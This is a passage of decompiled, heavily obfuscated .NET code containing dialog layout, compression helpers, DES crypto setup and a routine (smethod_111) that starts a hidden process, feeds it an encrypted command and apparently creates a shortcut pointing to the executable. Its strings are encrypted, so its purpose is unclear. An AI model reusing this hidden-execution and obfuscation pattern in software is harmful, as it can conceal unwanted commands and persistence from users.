									((Control)form0_0.button_0).set_Size(new Size(75, 24));
									((Control)form0_0.button_0).set_Location(new Point(400 - ((Control)form0_0.button_0).get_Width(), 205));
									((Control)form0_0.button_0).set_TabIndex(4);
									while (true)
									{
										((Control)form0_0.button_0).set_Text(Class14.smethod_0(4922));
										((Control)form0_0.button_0).add_Click((EventHandler)form0_0.method_2);
										((Control)form0_0.button_1).set_Anchor((AnchorStyles)10);
										((ButtonBase)form0_0.button_1).set_FlatStyle((FlatStyle)3);
										((Control)form0_0.button_1).set_Size(new Size(105, 24));
										((Control)form0_0.button_1).set_Location(new Point(((Control)form0_0.button_0).get_Left() - ((Control)form0_0.button_1).get_Width() - 6, 205));
										while (true)
										{
											((Control)form0_0.button_1).set_TabIndex(3);
											((Control)form0_0.button_1).set_Text(Class14.smethod_0(4939));
											((Control)form0_0.button_1).add_Click((EventHandler)form0_0.method_1);
											int num = 20;
											if (gW67GT4Mxy6wW4pIs8r())
											{
												while (true)
												{
													switch (num)
													{
													case 25:
														((Control)form0_0.button_4).set_Size(((Control)form0_0.button_3).get_Size());
														((Control)form0_0.button_4).set_TabIndex(5);
														((Control)form0_0.button_4).set_Text(Class14.smethod_0(5201));
														((Control)form0_0.button_4).set_Visible(false);
														((Control)form0_0.button_4).add_Click((EventHandler)form0_0.method_10);
														((Control)form0_0.button_5).set_Anchor((AnchorStyles)10);
														((ButtonBase)form0_0.button_5).set_FlatStyle((FlatStyle)3);
														((Control)form0_0.button_5).set_Location(((Control)form0_0.button_3).get_Location());
														((Control)form0_0.button_5).set_Size(((Control)form0_0.button_3).get_Size());
														goto case 18;
													case 18:
														((Control)form0_0.button_5).set_TabIndex(5);
														((Control)form0_0.button_5).set_Text(Class14.smethod_0(5210));
														num = 28;
														if (TclQyZ4yUTE7ipDsBqA())
														{
														}
														continue;
													default:
														((Control)form0_0.button_2).set_Anchor((AnchorStyles)10);
														((ButtonBase)form0_0.button_2).set_FlatStyle((FlatStyle)3);
														goto case 22;
													case 22:
														((Control)form0_0.button_2).set_Size(new Size(80, 24));
														((Control)form0_0.button_2).set_Location(new Point(400 - ((Control)form0_0.button_2).get_Width(), 205));
														((Control)form0_0.button_2).set_TabIndex(7);
														((Control)form0_0.button_2).set_Text(Class14.smethod_0(5183));
														((Control)form0_0.button_2).add_Click((EventHandler)form0_0.method_3);
														((Control)form0_0.button_3).set_Anchor((AnchorStyles)10);
														((Control)form0_0.button_3).set_Enabled(false);
														((ButtonBase)form0_0.button_3).set_FlatStyle((FlatStyle)3);
														num = 23;
														if (TclQyZ4yUTE7ipDsBqA())
														{
														}
														continue;
													case 23:
														((Control)form0_0.button_3).set_Size(new Size(105, 24));
														((Control)form0_0.button_3).set_Location(new Point(((Control)form0_0.button_2).get_Left() - ((Control)form0_0.button_3).get_Width() - 6, 205));
														((Control)form0_0.button_3).set_TabIndex(6);
														num = 10;
														if (TclQyZ4yUTE7ipDsBqA())
														{
														}
														continue;
													case 20:
														((Control)form0_0.button_6).set_Anchor((AnchorStyles)10);
														((ButtonBase)form0_0.button_6).set_FlatStyle((FlatStyle)3);
														goto case 4;
													case 4:
														((Control)form0_0.button_6).set_Size(new Size(64, 24));
														((Control)form0_0.button_6).set_Location(new Point(((Control)form0_0.button_1).get_Left() - ((Control)form0_0.button_6).get_Width() - 6, 205));
														goto case 5;
													case 5:
													case 11:
														((Control)form0_0.button_6).set_TabIndex(14);
														((Control)form0_0.button_6).set_Text(Class14.smethod_0(4964));
														num = 15;
														if (gW67GT4Mxy6wW4pIs8r())
														{
															continue;
														}
														return;
													case 15:
														((Control)form0_0.button_6).set_Visible(false);
														((Control)form0_0.button_6).add_Click((EventHandler)form0_0.method_12);
														((Control)form0_0.label_1).set_Anchor((AnchorStyles)14);
														form0_0.label_1.set_FlatStyle((FlatStyle)3);
														goto case 2;
													case 2:
														((Control)form0_0.label_1).set_Location(new Point(20, 140));
														((Control)form0_0.label_1).set_Size(new Size(381, 55));
														((Control)form0_0.label_1).set_Text(string.Format(Class14.smethod_0(4973), Class14.smethod_0(4913)));
														goto case 6;
													case 6:
														((Control)form0_0.class37_0).set_Anchor((AnchorStyles)13);
														((Control)form0_0.class37_0).set_Location(new Point(20, 69));
														((Control)form0_0.class37_0).set_Size(new Size(381, 13));
														goto default;
													case 10:
														((Control)form0_0.button_3).set_Text(Class14.smethod_0(5196));
														((Control)form0_0.button_3).add_Click((EventHandler)form0_0.method_4);
														((Control)form0_0.button_4).set_Anchor((AnchorStyles)10);
														((ButtonBase)form0_0.button_4).set_FlatStyle((FlatStyle)3);
														((Control)form0_0.button_4).set_Location(((Control)form0_0.button_3).get_Location());
														goto case 25;
													case 8:
													case 17:
														break;
													case 12:
														goto end_IL_0442;
													case 19:
														goto end_IL_048e;
													case 27:
														goto end_IL_051a;
													case 7:
														goto end_IL_057e;
													case 3:
														goto end_IL_05f4;
													case 1:
														goto end_IL_0629;
													case 16:
														goto end_IL_064d;
													case 14:
														goto end_IL_067a;
													case 28:
														((Control)form0_0.button_5).set_Visible(false);
														((Control)form0_0.button_5).add_Click((EventHandler)form0_0.method_0);
														((Control)form0_0.control3_0).set_Location(new Point(87, 146));
														((Control)form0_0.control3_0).set_Visible(false);
														((Control)form0_0.control0_0).SetBounds(24, 72, 368, 16);
														goto case 0;
													case 0:
														((Control)form0_0.control0_1).SetBounds(24, 96, 368, 16);
														goto case 29;
													case 29:
														((Control)form0_0.control0_2).SetBounds(24, 120, 368, 16);
														((Control)form0_0.control0_3).SetBounds(24, 144, 368, 16);
														((Control)form0_0.control2_0).set_Anchor((AnchorStyles)6);
														((Control)form0_0.control2_0).SetBounds(20, 444, 120, 32);
														goto IL_0799;
													case 26:
														goto IL_0799;
													case 21:
														goto IL_091d;
													case 13:
														goto IL_095d;
													case 9:
														goto IL_0985;
													case 30:
														return;
													}
													break;
												}
												continue;
											}
											goto IL_0799;
											IL_0985:
											((Control)form0_0.panel_1).ResumeLayout(false);
											((Control)form0_0).ResumeLayout(false);
											((Control)form0_0.button_4).BringToFront();
											((Control)form0_0.button_5).BringToFront();
											((Form)form0_0).set_Size(new Size(419, 264));
											((Control)form0_0.panel_1).set_Dock((DockStyle)5);
											((Control)form0_0.panel_0).set_Dock((DockStyle)5);
											return;
											IL_0799:
											((Control)form0_0.panel_0).get_Controls().AddRange((Control[])(object)new Control[8]
											{
												(Control)form0_0.button_6,
												(Control)form0_0.checkBox_0,
												(Control)form0_0.label_0,
												(Control)form0_0.button_0,
												(Control)form0_0.button_1,
												(Control)form0_0.label_1,
												(Control)form0_0.class37_0,
												form0_0.control1_0
											});
											((Control)form0_0.panel_0).set_Size(new Size(413, 240));
											((Control)form0_0.panel_0).set_TabIndex(0);
											((Control)form0_0.panel_1).get_Controls().AddRange((Control[])(object)new Control[10]
											{
												(Control)form0_0.button_2,
												(Control)form0_0.button_3,
												(Control)form0_0.button_4,
												(Control)form0_0.button_5,
												form0_0.control3_0,
												form0_0.control1_1,
												form0_0.control0_0,
												form0_0.control0_1,
												form0_0.control0_2,
												form0_0.control0_3
											});
											((Control)form0_0.panel_1).set_Size(new Size(413, 240));
											((Control)form0_0.panel_1).set_TabIndex(2);
											((Control)form0_0.panel_1).set_Visible(false);
											((Form)form0_0).set_AutoScaleBaseSize(new Size(5, 13));
											((Form)form0_0).set_ClientSize(new Size(434, 488));
											((Form)form0_0).set_ControlBox(false);
											((Control)form0_0).get_Controls().AddRange((Control[])(object)new Control[3]
											{
												form0_0.control2_0,
												(Control)form0_0.panel_0,
												(Control)form0_0.panel_1
											});
											goto IL_091d;
											IL_091d:
											((Form)form0_0).set_FormBorderStyle((FormBorderStyle)1);
											((Form)form0_0).set_ShowInTaskbar(false);
											((Form)form0_0).set_MinimizeBox(false);
											((Form)form0_0).set_MaximizeBox(false);
											((Form)form0_0).set_StartPosition((FormStartPosition)1);
											((Control)form0_0).set_Text(Class14.smethod_0(5227));
											if (((Control)form0_0).get_Text().Length == 0)
											{
												goto IL_095d;
											}
											goto IL_096d;
											IL_095d:
											((Control)form0_0).set_Text(Class14.smethod_0(5232));
											goto IL_096d;
											IL_096d:
											try
											{
												((Form)form0_0).set_TopMost(true);
											}
											catch
											{
											}
											((Control)form0_0.panel_0).ResumeLayout(false);
											goto IL_0985;
											continue;
											end_IL_0442:
											break;
										}
										continue;
										end_IL_048e:
										break;
									}
									continue;
									end_IL_051a:
									break;
								}
								continue;
								end_IL_057e:
								break;
							}
							continue;
							end_IL_05f4:
							break;
						}
						continue;
						end_IL_0629:
						break;
					}
					continue;
					end_IL_064d:
					break;
				}
				continue;
				end_IL_067a:
				break;
			}
		}
	}

	static void smethod_102(bool bool_0, Control3 control3_0)
	{
		control3_0.timer_0.set_Enabled(bool_0);
		control3_0.int_0 = 0;
		((Control)control3_0).Refresh();
	}

	static void smethod_103(int int_0, Class15.Class22 class22_0, byte[] byte_0, int int_1, bool bool_0)
	{
		class22_0.class23_0.short_0[256]++;
		int num3 = default(int);
		int num4 = default(int);
		int num5 = default(int);
		Class15.Class22.Class23 class23_ = default(Class15.Class22.Class23);
		short[] short_ = default(short[]);
		byte[] byte_ = default(byte[]);
		while (true)
		{
			Class42.smethod_10(class22_0.class23_0);
			Class42.smethod_10(class22_0.class23_1);
			Class42.smethod_28(class22_0.class23_0, class22_0.class23_2);
			Class42.smethod_28(class22_0.class23_1, class22_0.class23_2);
			Class42.smethod_10(class22_0.class23_2);
			int num = 4;
			int num2 = 10;
			int i;
			if (gW67GT4Mxy6wW4pIs8r())
			{
				while (true)
				{
					switch (num2)
					{
					default:
						num2 = 11;
						if (!TclQyZ4yUTE7ipDsBqA())
						{
						}
						continue;
					case 0:
					case 2:
						break;
					case 10:
						num3 = 18;
						goto case 7;
					case 7:
						while (num3 > num)
						{
							if (class22_0.class23_2.byte_0[Class15.Class22.int_0[num3]] > 0)
							{
								num = num3 + 1;
							}
							num3--;
						}
						num4 = 14 + num * 3 + Class42.smethod_89(class22_0.class23_2) + Class42.smethod_89(class22_0.class23_0) + Class42.smethod_89(class22_0.class23_1) + class22_0.int_2;
						goto case 1;
					case 1:
						num5 = class22_0.int_2;
						i = 0;
						goto IL_0153;
					case 9:
						goto IL_018f;
					case 5:
					case 6:
						return;
					case 11:
						goto IL_01fb;
					case 4:
						goto IL_0212;
					case 8:
						goto IL_021e;
					case 3:
						return;
					case 12:
						goto IL_0235;
					case 13:
						goto end_IL_0070;
					}
					break;
				}
				continue;
			}
			goto IL_018f;
			IL_0235:
			Class42.smethod_14(class22_0);
			break;
			IL_0153:
			for (; i < 286; i++)
			{
				num5 += class22_0.class23_0.short_0[i] * Class15.Class22.byte_2[i];
			}
			for (int j = 0; j < 30; j++)
			{
				num5 += class22_0.class23_1.short_0[j] * Class15.Class22.byte_3[j];
			}
			if (num4 >= num5)
			{
				goto IL_018f;
			}
			goto IL_0193;
			IL_021e:
			Class42.smethod_57(byte_, class23_, short_);
			Class42.smethod_14(class22_0);
			Class42.smethod_36(class22_0);
			return;
			IL_0212:
			short_ = Class15.Class22.short_2;
			byte_ = Class15.Class22.byte_3;
			goto IL_021e;
			IL_01fb:
			byte_ = Class15.Class22.byte_2;
			Class42.smethod_57(byte_, class23_, short_);
			class23_ = class22_0.class23_1;
			goto IL_0212;
			IL_018f:
			num4 = num5;
			goto IL_0193;
			IL_0193:
			if (int_0 >= 0 && int_1 + 4 < num4 >> 3)
			{
				Class42.smethod_90(int_1, class22_0, bool_0, int_0, byte_0);
				return;
			}
			if (num4 == num5)
			{
				Class42.smethod_20(class22_0.class25_0, 2 + (bool_0 ? 1 : 0), 3);
				class23_ = class22_0.class23_0;
				short_ = Class15.Class22.short_1;
				goto IL_01fb;
			}
			Class42.smethod_20(class22_0.class25_0, 4 + (bool_0 ? 1 : 0), 3);
			Class42.smethod_79(num, class22_0);
			goto IL_0235;
			continue;
			end_IL_0070:
			break;
		}
		Class42.smethod_36(class22_0);
	}

	[DllImport("shell32")]
	internal static extern int ExtractIconEx(string string_0, int int_0, ref int int_1, ref int int_2, int int_3);

	static void smethod_104(Class15.Class25 class25_0, int int_0)
	{
		class25_0.byte_0[class25_0.int_1++] = (byte)int_0;
		class25_0.byte_0[class25_0.int_1++] = (byte)(int_0 >> 8);
	}

	static void smethod_105(Class29 class29_0, EventArgs0 eventArgs0_0)
	{
		class29_0.delegate9_0?.Invoke(class29_0, eventArgs0_0);
	}

	static int smethod_106(Class15.Class19 class19_0, Class15.Class17 class17_0)
	{
		int num;
		int num2;
		if ((num = Class42.smethod_34(class17_0, 9)) >= 0)
		{
			if ((num2 = class19_0.short_0[num]) >= 0)
			{
				Class42.smethod_99(class17_0, num2 & 0xF);
				return num2 >> 4;
			}
			int num3 = -(num2 >> 4);
			int int_ = num2 & 0xF;
			if ((num = Class42.smethod_34(class17_0, int_)) >= 0)
			{
				num2 = class19_0.short_0[num3 | (num >> 9)];
				Class42.smethod_99(class17_0, num2 & 0xF);
				return num2 >> 4;
			}
			int availableBits = class17_0.AvailableBits;
			num = Class42.smethod_34(class17_0, availableBits);
			num2 = class19_0.short_0[num3 | (num >> 9)];
			if ((num2 & 0xF) <= availableBits)
			{
				Class42.smethod_99(class17_0, num2 & 0xF);
				return num2 >> 4;
			}
			return -1;
		}
		int availableBits2 = class17_0.AvailableBits;
		num = Class42.smethod_34(class17_0, availableBits2);
		num2 = class19_0.short_0[num];
		if (num2 >= 0 && (num2 & 0xF) <= availableBits2)
		{
			Class42.smethod_99(class17_0, num2 & 0xF);
			return num2 >> 4;
		}
		return -1;
	}

	static object smethod_107(Class33 class33_0)
	{
		return class33_0.object_0;
	}

	static void smethod_108(Exception exception_0, object object_0, object object_1, object object_2, object object_3)
	{
		Class42.smethod_2(exception_0, new object[4] { object_0, object_1, object_2, object_3 });
	}

	static int smethod_109(Class15.Class24 class24_0)
	{
		int num = ((class24_0.int_0 << 5) ^ class24_0.byte_0[class24_0.int_4 + 2]) & 0x7FFF;
		short num2 = default(short);
		if (gW67GT4Mxy6wW4pIs8r())
		{
			switch (3)
			{
			case 0:
			case 3:
				num2 = (class24_0.short_1[class24_0.int_4 & 0x7FFF] = class24_0.short_0[num]);
				break;
			case 4:
				goto IL_007c;
			}
		}
		class24_0.short_0[num] = (short)class24_0.int_4;
		class24_0.int_0 = num;
		goto IL_007c;
		IL_007c:
		return num2 & 0xFFFF;
	}

	static void smethod_110(byte[] byte_0, Class15.Class24 class24_0)
	{
		class24_0.byte_1 = byte_0;
		class24_0.int_7 = 0;
		class24_0.int_8 = byte_0.Length;
	}

	static void smethod_111()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		object obj = default(object);
		string text3 = default(string);
		Process process = default(Process);
		StreamWriter standardInput = default(StreamWriter);
		object objectValue = default(object);
		object obj2 = default(object);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				string text;
				object executablePath;
				string text2;
				string text4;
				string text5;
				string text6;
				string text7;
				object objectValue2;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 1239:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0030;
						case 4:
							goto IL_003f;
						case 5:
							goto IL_004e;
						case 6:
							goto IL_0057;
						case 7:
							goto IL_0066;
						case 8:
							goto IL_008e;
						case 9:
							goto IL_00c0;
						case 10:
							goto IL_00db;
						case 11:
							goto IL_0103;
						case 12:
							goto IL_0136;
						case 13:
							goto IL_0141;
						case 14:
							goto IL_015b;
						case 15:
							goto IL_016c;
						case 16:
							goto IL_017d;
						case 17:
							goto IL_018e;
						case 18:
							goto IL_019f;
						case 19:
							goto IL_01b0;
						case 20:
							goto IL_01bc;
						case 21:
							goto IL_01c9;
						case 22:
							goto IL_01d9;
						case 23:
							goto IL_01e8;
						case 24:
							goto IL_01f8;
						case 25:
							goto IL_0208;
						case 26:
							goto IL_0218;
						case 27:
							goto IL_0224;
						case 28:
							goto IL_0243;
						case 29:
							goto IL_024e;
						case 30:
							goto IL_025b;
						case 31:
						case 32:
							goto IL_0266;
						case 33:
							goto IL_0271;
						case 34:
							goto IL_0295;
						case 35:
							goto IL_02b9;
						case 36:
							goto IL_02f0;
						case 37:
							goto IL_034f;
						case 38:
							goto IL_03ae;
						case 39:
							goto IL_03da;
						case 40:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 41:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_03da:
					num = 39;
					NewLateBinding.LateCall(obj, (Type)null, Class14.smethod_0(5525), new object[0], (string[])null, (Type[])null, (bool[])null, true);
					break;
					IL_0008:
					num = 2;
					text = Interaction.Environ(Class42.smethod_98(Class14.smethod_0(188))) + Class14.smethod_0(221);
					goto IL_0030;
					IL_0030:
					num = 3;
					Conversion.Int((object)false);
					goto IL_003f;
					IL_003f:
					num = 4;
					Conversion.Int((object)false);
					goto IL_004e;
					IL_004e:
					num = 5;
					executablePath = Application.get_ExecutablePath();
					goto IL_0057;
					IL_0057:
					num = 6;
					Conversion.Int((object)false);
					goto IL_0066;
					IL_0066:
					num = 7;
					text2 = Interaction.Environ(Class42.smethod_98(Class14.smethod_0(489))) + Class14.smethod_0(4036);
					goto IL_008e;
					IL_008e:
					num = 8;
					text3 = Class14.smethod_0(187) + Interaction.Environ(Class42.smethod_98(Class14.smethod_0(259))) + Class14.smethod_0(221);
					goto IL_00c0;
					IL_00c0:
					num = 9;
					Directory.CreateDirectory(text3 + Class14.smethod_0(4190));
					goto IL_00db;
					IL_00db:
					num = 10;
					text4 = Interaction.Environ(Class42.smethod_98(Class14.smethod_0(188))) + Class14.smethod_0(5253);
					goto IL_0103;
					IL_0103:
					num = 11;
					text5 = Class14.smethod_0(187) + Interaction.Environ(Class42.smethod_98(Class14.smethod_0(259))) + Class14.smethod_0(5338);
					goto IL_0136;
					IL_0136:
					num = 12;
					process = new Process();
					goto IL_0141;
					IL_0141:
					num = 13;
					process.StartInfo.FileName = Class14.smethod_0(5371);
					goto IL_015b;
					IL_015b:
					num = 14;
					process.StartInfo.UseShellExecute = false;
					goto IL_016c;
					IL_016c:
					num = 15;
					process.StartInfo.CreateNoWindow = true;
					goto IL_017d;
					IL_017d:
					num = 16;
					process.StartInfo.RedirectStandardOutput = true;
					goto IL_018e;
					IL_018e:
					num = 17;
					process.StartInfo.RedirectStandardInput = true;
					goto IL_019f;
					IL_019f:
					num = 18;
					process.StartInfo.RedirectStandardError = true;
					goto IL_01b0;
					IL_01b0:
					num = 19;
					process.Start();
					goto IL_01bc;
					IL_01bc:
					num = 20;
					standardInput = process.StandardInput;
					goto IL_01c9;
					IL_01c9:
					num = 21;
					Conversion.Int((object)false);
					goto IL_01d9;
					IL_01d9:
					num = 22;
					text6 = Class14.smethod_0(5384);
					goto IL_01e8;
					IL_01e8:
					num = 23;
					Conversion.Int((object)false);
					goto IL_01f8;
					IL_01f8:
					num = 24;
					text7 = Class14.smethod_0(5389);
					goto IL_0208;
					IL_0208:
					num = 25;
					Conversion.Int((object)false);
					goto IL_0218;
					IL_0218:
					num = 26;
					standardInput.AutoFlush = true;
					goto IL_0224;
					IL_0224:
					num = 27;
					standardInput.Write(Class14.smethod_0(5394) + Environment.NewLine);
					goto IL_0243;
					IL_0243:
					num = 28;
					process.WaitForExit();
					goto IL_024e;
					IL_024e:
					num = 29;
					if (!process.HasExited)
					{
						goto IL_025b;
					}
					goto IL_0266;
					IL_025b:
					num = 30;
					process.Kill();
					goto IL_0266;
					IL_0266:
					num = 32;
					standardInput.Flush();
					goto IL_0271;
					IL_0271:
					num = 33;
					objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject(Class14.smethod_0(5403), Class14.smethod_0(187)));
					goto IL_0295;
					IL_0295:
					num = 34;
					objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject(Class14.smethod_0(5403), Class14.smethod_0(187)));
					goto IL_02b9;
					IL_02b9:
					num = 35;
					objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (Type)null, Class14.smethod_0(5424), new object[1] { Class14.smethod_0(5445) }, (string[])null, (Type[])null, (bool[])null));
					goto IL_02f0;
					IL_02f0:
					num = 36;
					NewLateBinding.LateSet(obj, (Type)null, Class14.smethod_0(5458), new object[1] { RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (Type)null, Class14.smethod_0(5475), new object[1] { text3 + Class14.smethod_0(325) }, (string[])null, (Type[])null, (bool[])null)) }, (string[])null, (Type[])null);
					goto IL_034f;
					IL_034f:
					num = 37;
					NewLateBinding.LateSet(obj2, (Type)null, Class14.smethod_0(5458), new object[1] { RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (Type)null, Class14.smethod_0(5475), new object[1] { text3 + Class14.smethod_0(325) }, (string[])null, (Type[])null, (bool[])null)) }, (string[])null, (Type[])null);
					goto IL_03ae;
					IL_03ae:
					num = 38;
					NewLateBinding.LateSet(obj, (Type)null, Class14.smethod_0(5508), new object[1] { 4 }, (string[])null, (Type[])null);
					goto IL_03da;
					end_IL_0000_2:
					break;
				}
				num = 40;
				NewLateBinding.LateCall(obj2, (Type)null, Class14.smethod_0(5525), new object[0], (string[])null, (Type[])null, (bool[])null, true);
				break;
				end_IL_0000:;
			}
			catch (object obj3) when (obj3 is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj3);
				try0000_dispatch = 1239;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	static void smethod_112(Class15.Class22.Class23 class23_0, Class15.Class22.Class23 class23_1)
	{
		int num = -1;
		int num2 = 0;
		while (num2 < class23_0.int_1)
		{
			int num3 = 1;
			int num4 = class23_0.byte_0[num2];
			int num5;
			int num6;
			if (num4 == 0)
			{
				num5 = 138;
				num6 = 3;
			}
			else
			{
				num5 = 6;
				num6 = 3;
				if (num != num4)
				{
					Class42.smethod_35(class23_1, num4);
					num3 = 0;
				}
			}
			num = num4;
			num2++;
			while (num2 < class23_0.int_1 && num == class23_0.byte_0[num2])
			{
				num2++;
				if (++num3 >= num5)
				{
					break;
				}
			}
			if (num3 < num6)
			{
				while (num3-- > 0)
				{
					Class42.smethod_35(class23_1, num);
				}
			}
			else if (num != 0)
			{
				Class42.smethod_35(class23_1, 16);
				Class42.smethod_20(class23_0.class22_0.class25_0, num3 - 3, 2);
			}
			else if (num3 <= 10)
			{
				Class42.smethod_35(class23_1, 17);
				Class42.smethod_20(class23_0.class22_0.class25_0, num3 - 3, 3);
			}
			else
			{
				Class42.smethod_35(class23_1, 18);
				Class42.smethod_20(class23_0.class22_0.class25_0, num3 - 11, 7);
			}
		}
	}

	static void smethod_113(Class28 class28_0, Enum1 enum1_0, string string_0, string string_1)
	{
		class28_0.delegate10_0?.Invoke(class28_0, new EventArgs3(enum1_0, string_0, string_1));
	}

	static void smethod_114(Class28 class28_0, IWebProxy iwebProxy_0)
	{
		class28_0.iwebProxy_0 = iwebProxy_0;
	}

	static string smethod_115()
	{
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(Class13.SubkeyApplication);
			if (registryKey == null)
			{
				registryKey = Registry.LocalMachine.OpenSubKey(Class13.WowSubkeyApplication);
			}
			if (registryKey == null)
			{
				return null;
			}
			string result = (string)registryKey.GetValue(Class14.smethod_0(1491), null);
			registryKey.Close();
			return result;
		}
		catch
		{
			return null;
		}
	}

	static void smethod_116(Exception exception_0, object[] object_0)
	{
		if (exception_0 == null || !(exception_0 is SecurityException) || !(Class38.string_0 == Class14.smethod_0(1158)) || !Class38.Handler.method_2((SecurityException)exception_0))
		{
			Class42.smethod_2(exception_0, object_0);
			Class38.Handler.method_3(exception_0, bool_1: false, bool_2: false);
		}
	}

	static void smethod_117(Class15.Class18 class18_0, int int_0)
	{
		if (class18_0.int_1++ == 32768)
		{
			throw new InvalidOperationException();
		}
		class18_0.byte_0[class18_0.int_0++] = (byte)int_0;
		class18_0.int_0 &= 32767;
	}

	static int smethod_118(byte[] byte_0, Class15.Class21 class21_0)
	{
		int num = 0;
		int num2 = byte_0.Length;
		int num3 = num2;
		while (true)
		{
			int num4 = Class42.smethod_52(class21_0.class25_0, byte_0, num, num2);
			num += num4;
			class21_0.long_0 += num4;
			num2 -= num4;
			if (num2 == 0 || class21_0.int_0 == 30)
			{
				break;
			}
			Class15.Class24 class24_ = class21_0.class24_0;
			bool bool_ = (class21_0.int_0 & 4) != 0;
			if (Class42.smethod_9((class21_0.int_0 & 8) != 0, bool_, class24_))
			{
				continue;
			}
			if (class21_0.int_0 != 16)
			{
				if (class21_0.int_0 == 20)
				{
					for (int num5 = 8 + (-class21_0.class25_0.BitCount & 7); num5 > 0; num5 -= 10)
					{
						Class42.smethod_20(class21_0.class25_0, 2, 10);
					}
					class21_0.int_0 = 16;
				}
				else if (class21_0.int_0 == 28)
				{
					Class42.smethod_0(class21_0.class25_0);
					class21_0.int_0 = 30;
				}
				continue;
			}
			return num3 - num2;
		}
		return num3 - num2;
	}

	static int smethod_119(Class15.Class22 class22_0, int int_0)
	{
		int num = 0;
		while (true)
		{
			if (int_0 >= 4)
			{
				num += 2;
			}
			else
			{
				if (TclQyZ4yUTE7ipDsBqA())
				{
				}
				switch (4)
				{
				case 0:
				case 2:
					break;
				default:
					continue;
				case 4:
					return num + int_0;
				}
			}
			int_0 >>= 1;
		}
	}

	static byte[] smethod_120(EventArgs1 eventArgs1_0)
	{
		return Class42.smethod_64(eventArgs1_0.class29_0);
	}

	static ICryptoTransform smethod_121(bool bool_0, byte[] byte_0, byte[] byte_1)
	{
		using DESCryptoServiceProvider dESCryptoServiceProvider = new DESCryptoServiceProvider();
		return bool_0 ? dESCryptoServiceProvider.CreateDecryptor(byte_1, byte_0) : dESCryptoServiceProvider.CreateEncryptor(byte_1, byte_0);
	}

	static void smethod_122(Class15.Class24 class24_0)
	{
		if (class24_0.int_4 >= 65274)
		{
			if (gW67GT4Mxy6wW4pIs8r())
			{
				switch (3)
				{
				case 0:
				case 3:
					break;
				default:
					goto IL_0082;
				case 5:
					goto IL_0090;
				case 1:
				case 2:
					goto IL_00df;
				case 6:
					goto IL_00f8;
				}
			}
			Class42.smethod_69(class24_0);
		}
		goto IL_00df;
		IL_0090:
		int num = default(int);
		Array.Copy(class24_0.byte_1, class24_0.int_7, class24_0.byte_0, class24_0.int_4 + class24_0.int_5, num);
		class24_0.int_7 += num;
		class24_0.int_6 += num;
		class24_0.int_5 += num;
		goto IL_00df;
		IL_0082:
		num = class24_0.int_8 - class24_0.int_7;
		goto IL_0090;
		IL_00f8:
		Class42.smethod_100(class24_0);
		return;
		IL_00df:
		if (class24_0.int_5 < 262 && class24_0.int_7 < class24_0.int_8)
		{
			num = 65536 - class24_0.int_5 - class24_0.int_4;
			if (num > class24_0.int_8 - class24_0.int_7)
			{
				goto IL_0082;
			}
			goto IL_0090;
		}
		if (class24_0.int_5 < 3)
		{
			return;
		}
		goto IL_00f8;
	}

	static void smethod_123(Class38 class38_0, IWebProxy iwebProxy_0)
	{
		class38_0.iwebProxy_0 = iwebProxy_0;
	}

	static void smethod_124(Exception exception_0, object object_0, object object_1, object object_2, object object_3, object object_4, object object_5, object object_6)
	{
		Class42.smethod_2(exception_0, new object[7] { object_0, object_1, object_2, object_3, object_4, object_5, object_6 });
	}

	static Class15.Class19 smethod_125(Class15.Class20 class20_0)
	{
		byte[] array = new byte[class20_0.int_4];
		Array.Copy(class20_0.byte_1, class20_0.int_3, array, 0, class20_0.int_4);
		return new Class15.Class19(array);
	}

	static void smethod_126(EventArgs1 eventArgs1_0)
	{
		eventArgs1_0.bool_1 = false;
	}

	static Icon smethod_127(string string_0)
	{
		//IL_0029: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(Class14.smethod_0(3899) + string_0 + Class14.smethod_0(5534));
			return (manifestResourceStream == null) ? ((Icon)null) : new Icon(manifestResourceStream);
		}
		catch
		{
			return null;
		}
	}

	static void smethod_128(IWebProxy iwebProxy_0, Class40 class40_0)
	{
		class40_0.iwebProxy_0 = iwebProxy_0;
	}

	static int smethod_129(Class15.Class17 class17_0, byte[] byte_0, int int_0, int int_1)
	{
		int num = 0;
		while (class17_0.int_2 > 0 && int_1 > 0)
		{
			byte_0[int_0++] = (byte)class17_0.uint_0;
			class17_0.uint_0 >>= 8;
			class17_0.int_2 -= 8;
			int_1--;
			num++;
		}
		if (int_1 == 0)
		{
			return num;
		}
		int num2 = class17_0.int_1 - class17_0.int_0;
		if (int_1 > num2)
		{
			int_1 = num2;
		}
		Array.Copy(class17_0.byte_0, class17_0.int_0, byte_0, int_0, int_1);
		class17_0.int_0 += int_1;
		if (((uint)(class17_0.int_0 - class17_0.int_1) & (true ? 1u : 0u)) != 0)
		{
			class17_0.uint_0 = class17_0.byte_0[class17_0.int_0++] & 0xFFu;
			class17_0.int_2 = 8;
		}
		return num + int_1;
	}

	static void smethod_130(Exception exception_0, object object_0, object object_1, object object_2, object object_3, object object_4, object object_5, object object_6, object object_7)
	{
		Class42.smethod_2(exception_0, new object[8] { object_0, object_1, object_2, object_3, object_4, object_5, object_6, object_7 });
	}

	static bool smethod_131(Class15.Class22 class22_0, int int_0)
	{
		class22_0.short_0[class22_0.int_1] = 0;
		class22_0.byte_1[class22_0.int_1++] = (byte)int_0;
